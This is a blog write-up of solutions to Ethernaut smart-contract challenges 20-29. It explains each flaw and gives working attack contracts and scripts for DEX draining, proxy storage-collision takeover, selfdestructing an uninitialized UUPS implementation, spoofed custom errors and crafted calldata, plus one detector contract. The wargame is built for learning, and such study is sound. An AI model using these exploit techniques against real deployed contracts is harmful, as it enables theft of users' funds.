---
title: 'Ethernaut Solutions Part 3: 20-29'
date: 2024-01-04T10:00:35+08:00
draft: false
tags: ["ctf"]
---

## Introduction

This is the Part 3 of Ethernaut Solution series:
- [Part 1](../ethernaut-solutions-part-1)
- [Part 2](../ethernaut-solutions-part-2)
- Part 3 (Current)

You can find all my solutions and local setup in this [GitHub repository](https://github.com/pkqs90/ethernaut-solutions).

This post will cover solutions for challenges 20-29. These ten challenges rank as the most difficult in the entire series, encompassing a range of real-world scenarios like DEX and proxy patterns. They also require a bit deep understanding of Solidity internals, such as the encoding of calldata.

## Solutions

### 20. Denial

This challenge is very similar to [Challenge #9 King](../ethernaut-solutions-part-1/#9-king). However, in King, the challenge uses `transfer()` for transfering funds while this one uses `call()`. The difference is (reference https://solidity-by-example.org/sending-ether/):

- `transfer()` (2300 gas, throws error)
- `send()` (2300 gas, returns bool)
- `call()` (forward all gas or set gas, returns bool)

So we cannot throw errors in our contract's `receive()` function, since the challenge contract does not check `call()`'s return value. However, note that `call()` by default forwards all gas to the callee, so we can solve this challenge by writing an infinite loop to use up all gas:

```sol
contract DenialAttack {

  fallback() external payable {
    while (true) {
    }
  }

}
```

### 21. Shop

This challenge is very similar to [Challenge #11 Elevator](../ethernaut-solutions-part-2/#11-elevator). However, in Elevator, the called function is not marked with `view` keyword. Recall that `view` functions declares that no state will be changed, so we can't solve this challenge like what we did in Elevator.

The key here is to use the challenge contract's `isSold()` function (for all public variables, it will automatically setup a getter function). We can write a if-statement to select our return value depending on whether `isSold()` is true for false.

```sol
contract ShopAttack {

  IShop challenge;

  constructor(address addr) {
    challenge = IShop(addr);
  }

  function price() external view returns (uint) {
    return challenge.isSold() ? 0 : 100;
  }

  function attack() public {
    challenge.buy();
  }

}
```

### 22. Dex

This challenge implements a simple DEX swap functionality. The issue lies within the `getSwapPrice()` function, which inaccurately computes the swap amount. DEXes employ an AMM (Automated market-making) formula `x * y = K`, implying that the product of the two token amounts remains constant. However, the formula used in this challenge results in the DEX dispensing an excessive amount of to tokens to the user. Therefore, our attack vector would be to conduct swaps repeatedly until one of the tokens is completely drained.

```js
it("Solves 22-Dex", async function () {
  // ...
  // Approve dex to spend all our tokens.
  await challenge.approve(await challenge.getAddress(), 1000000);
  // Swap a few times then we can have enough tokens to drain the DEX.
  // user token1 = 0n
  // user token2 = 20n
  // user token1 = 24n
  // user token2 = 0n
  // user token1 = 0n
  // user token2 = 30n
  // user token1 = 41n
  // user token2 = 0n
  // user token1 = 0n
  // user token2 = 65n
  // Dex token1 = 110n
  // Dex token2 = 45n
  for (let i = 0; i < 2; ++i) {
    await challenge.swap(token1, token2, await challenge.balanceOf(token1, address));
    // console.log("user token1 =", await challenge.balanceOf(token1, address));
    // console.log("user token2 =", await challenge.balanceOf(token2, address));
    await challenge.swap(token2, token1, await challenge.balanceOf(token2, address));
    // console.log("user token1 =", await challenge.balanceOf(token1, address));
    // console.log("user token2 =", await challenge.balanceOf(token2, address));
  }
  await challenge.swap(token1, token2, await challenge.balanceOf(token1, address));
  // console.log("user token1 =", await challenge.balanceOf(token1, address));
  // console.log("user token2 =", await challenge.balanceOf(token2, address));
  const token1Remaining = await challenge.balanceOf(token1, await challenge.getAddress());
  const token2Remaining = await challenge.balanceOf(token2, await challenge.getAddress());
  // console.log("Dex token1 =", token1Remaining);
  // console.log("Dex token2 =", token2Remaining);
  await challenge.swap(token2, token1, token2Remaining);
  expect(await submitLevel(await challenge.getAddress())).to.equal(true);
});

```

### 23. Dex Two

This challenge is very similar to the previous one, with the key difference being the need to drain **both** tokens from the DEX. In the `swap()` function, there's no longer a check for token validity. This allows us to deploy our own tokens and swap both `token1` and `token2` out of the DEX.

```js
it("Solves 23-DexTwo", async function () {
  // ...
  // Build two dummy tokens to swap for the 2 tokens we really want.
  const factory = await ethers.getContractFactory("DexTwoAttackerToken");
  const attackerToken1 = await factory.deploy("name", "symbol", 1000000000);
  await attackerToken1.waitForDeployment();
  const attackerToken1Address = await attackerToken1.getAddress();
  const attackerToken2 = await factory.deploy("name2", "symbol2", 1000000000);
  await attackerToken2.waitForDeployment();
  const attackerToken2Address = await attackerToken2.getAddress();

  const token1Address = await challenge.token1();
  const token2Address = await challenge.token2();

  // Approve dex to spend all our tokens.
  await challenge.approve(challengeAddress, 1000000);
  await attackerToken1.approve(challengeAddress, 1000000);
  await attackerToken2.approve(challengeAddress, 1000000);

  // Drain token1
  await attackerToken1.transfer(challengeAddress, 100);
  await challenge.swap(attackerToken1Address, token1Address, 100);

  // Drain token2
  await attackerToken2.transfer(challengeAddress, 100);
  await challenge.swap(attackerToken2Address, token2Address, 100);

  expect(await submitLevel(await challenge.getAddress())).to.equal(true);
});

```

### 24. Puzzle Wallet

I think this is the hardest challenge in Ethernaut. It requires an understanding of proxy patterns and the workings of `delegatecall()`. The primary problem with this contract lies in the data storage collision between the proxy and implementation contracts. Specifically, `pendingAdmin/owner` share slot 0, while `admin/maxBalance` share slot 1.

Therefore, we can easily become the owner of the implementation contract by using the `proposeNewAdmin()` function and then whitelist ourselves for subsequent actions. Note that if we reduce the implementation contract's balance to zero, we can invoke `setMaxBalance()` and set the `maxBalance` (which, in the context of the proxy contract, equates to `admin`). And just like that, we achieve our goal.

The key question is how to drain the wallet's balance. It's important to note that the `multicall()` function restricts us from making multiple deposit calls. However, we can circumvent this by wrapping a deposit inside another multicall. Since this operation uses a `delegatecall()`, the `msg.value` pertains. This approach allows us to deposit double the amount of funds that we actually send.

```js
it("Solves 24-Puzzle", async function () {
  // ...
  // Step 1: Modify slot 0 to modify the `owner` in Wallet contract.
  await challenge.proposeNewAdmin(eoaAddress);

  // Step 2: Add eoa to whitelist.
  await eoa.sendTransaction({
    to: challengeAddress,
    data: interface.encodeFunctionData("addToWhitelist", [eoaAddress])
  });

  // Step 3: Deposit 2 times and withdraw once. Wrap one of the deposits in a multicall to bypass the deposit once check.
  // This is to fulfill the contract balance == 0 check.
  const depositCallData = interface.encodeFunctionData("deposit", []);
  const wrappedDepositCallData = interface.encodeFunctionData("multicall", [[depositCallData]]);
  const executeCallData = interface.encodeFunctionData("execute", [eoaAddress, ethers.parseEther("0.002"), "0x"]);
  const multiCallData = interface.encodeFunctionData("multicall", [[depositCallData, wrappedDepositCallData, executeCallData]]);

  await eoa.sendTransaction({
    to: challengeAddress,
    data: multiCallData,
    value: ethers.parseEther("0.001"),
  });

  // Step 4: Simply set the admin by `setMaxBalance` because they share the same slot 1.
  await eoa.sendTransaction({
    to: challengeAddress,
    data: interface.encodeFunctionData("setMaxBalance", [BigInt(eoaAddress)]),
  });

  expect(await submitLevel(await challenge.getAddress())).to.equal(true);
});

```

### 25. Motorbike

This challenge uses an [UUPS upgradable pattern](https://forum.openzeppelin.com/t/uups-proxies-tutorial-solidity-javascript/7786) where the Motorbike serves as the proxy contract and Engine as the implementation contract.

At first glance, the contract seems pretty legit. The Engine's `initialize()` function has a `initializer` protecting it to be only called once. However, we can find that in Motorbike's contructor, it uses a `delegatecall()` to call the `initialize()` function of the Engine. This means the slot storage for `Initializable` is set for Motorbike instead of Engine, which means the Engine is not initialized at all.

Thus our attack vector is clear:
1. Get Engine's contract address by looking up the `_IMPLEMENTATION_SLOT` slot of Motorbike.
2. Call Engine's `initialize()` function to take over ownership and upgrade it to a selfdestruct contract.

```sol
contract MotorbikeAttacker {
  address implementation;

  constructor(address addr) {
    implementation = addr;
  }

  function takeControl() public {
    bytes memory callData = abi.encodeWithSignature("initialize()");
    (bool success, ) = implementation.call(callData);
    require(success);
  }

  function attack() public {
    address addr = address(new SelfDestructContract());
    bytes memory callData = abi.encodeWithSignature("upgradeToAndCall(address,bytes)", addr, abi.encodeWithSignature("attack()"));
    (bool success, ) = implementation.call(callData);
    require(success);
  }
}

contract SelfDestructContract {
  function attack() external {
    selfdestruct(payable(address(0)));
  }
}
```

### 26. DoubleEntryPoint

This challenge is quite interesting because it requires us to write a alert detector for the buggy contract instead of hacking it. Nonetheless, we still need to spy the exploit first.

The `Vault` has 100 `LegacyToken`s and 100 `DoubleEntryPoint`s, and out goal is to prevent hackers from sweeping its `DoubleEntryPoint`s. We see that inside the `sweekToken()` there is a check that the token should not be `DoubleEntryPoint`. However, if we pass `LegacyToken` to it, it will still transfer `DoubleEntryPoint` since it delegates the transfer to it.

```sol
contract LegacyToken is ERC20("LegacyToken", "LGT"), Ownable {
	// ...
    function transfer(address to, uint256 value) public override returns (bool) {
        if (address(delegate) == address(0)) {
            return super.transfer(to, value);
        } else {
            return delegate.delegateTransfer(to, value, msg.sender);
        }
    }
}
```
Having identified the exploit, our next step is to write code that generates alerts. Given the calldata passed to the `DoubleEntryPoint`'s `delegateTransfer()` function, we can verify if the sender is the vault itself. This check is crucial because under no normal circumstances would the vault initiate a transfer to `DoubleEntryPoint` on its own.

```sol
contract DoubleEntryPointDetector {
  // ...
  function handleTransaction(address user, bytes calldata msgData) external {
    (address to, uint256 value, address origSender) = abi.decode(msgData[4:], (address, uint256, address));
    if (origSender == vaultAddr) {
      forta.raiseAlert(userAddr);
    }
  }
}
```

### 27. Good Samaritan

The exploit in this challenge is that the contract uses a custom error to check whether wallet balance is enough or not.

```sol
function requestDonation() external returns(bool enoughBalance){
    // donate 10 coins to requester
    try wallet.donate10(msg.sender) {
        return true;
    } catch (bytes memory err) {
        if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
            // send the coins left
            wallet.transferRemainder(msg.sender);
            return false;
        }
    }
}
```
Custom errors that have identical definitions and parameters share the same ABI encoding. This means we can write a contract that throws the same error, and as a result, the challenge contract will transfer its remaining funds to us.

```sol
contract GoodSamaritanAttacker is INotifyable {

  GoodSamaritan samaritan;
  error NotEnoughBalance();

  constructor(address addr) {
    samaritan = GoodSamaritan(addr);
  }

  function attack() external {
    samaritan.requestDonation();
  }

  function notify(uint256 amount) public {
    if (amount == 10) {
      revert NotEnoughBalance();
    }
  }
}
```

### 28. Gatekeeper Three

This is a fairly simple challenge, I don't know why its difficulty is rated 3/5. There are three gates to bypass:

1. Gate 1: Claim ownership by calling the mis-spelled constructor `construct0r`, and use a intermediary contract to bypass the `tx.origin != owner` check.
2. Gate 2: Put everything in 1 transaction and they will share the `block.timestamp`.
3. Gate 3: Send the contract some ether while not implementing a `receive()` function so it cannot receive funds.

```sol
contract GatekeeperThreeAttacker {

    GatekeeperThree challenge;

    constructor(address payable addr) payable {
        challenge = GatekeeperThree(addr);
    }

    function attack() public {
        challenge.construct0r();
        challenge.createTrick();
        challenge.getAllowance(block.timestamp);
        (bool success, ) = payable(address(challenge)).call{value: 0.002 ether}("");
        require(success, "Failed to transfer eth");
        challenge.enter();
    }

}
```

### 29. Switch

To solve this challenge, we must know how `calldata` is encoded and how it is deciphered.

Read the official docs for more details: https://docs.soliditylang.org/en/v0.8.21/abi-spec.html#examples

For a normal `turnSwitchOff()` call, the `calldata` for `flipSwitch` would be:
1. First 4 bytes: Function selector for `flipSwitch`
2. Next 8 bytes: Location of `calldata` for `turnSwitchOff()` (0x20)
3. Next 8 bytes: Length of `calldata` for `turnSwitchOff()` (0x04)
4. Next 8 bytes: `calldata` for `turnSwitchOff()` (Function selector)

This would pass the selector check at bytes 68. However, to pass the challenge, we must hide a real `turnSwitchOn()` while still having the selector for `turnSwitchOff()` at bytes 68. See below code for details.


```js
const flipSelector = challenge.interface.encodeFunctionData("flipSwitch", ["0x"]).slice(2, 10);
const onSelector = challenge.interface.encodeFunctionData("turnSwitchOn", []).slice(2, 10);
const offSelector = challenge.interface.encodeFunctionData("turnSwitchOff", []).slice(2, 10);

const payload = "0x" + flipSelector // Function selector for `flipSwitch`
  + ("0".repeat(62) + "60")         // Location of calldata
  + ("0".repeat(64))                // Dummy buffer to bypass `offSelector` check in modifier
  + offSelector + ("0".repeat(56))  // Function selector for `offSelector`
  + ("0".repeat(63) + "4")          // Length of calldata (4 bytes for function selector)
  + onSelector + ("0".repeat(56));  // Function selector for `onSelector`

await eoa.sendTransaction({
  to: await challenge.getAddress(),
  data: payload,
})
```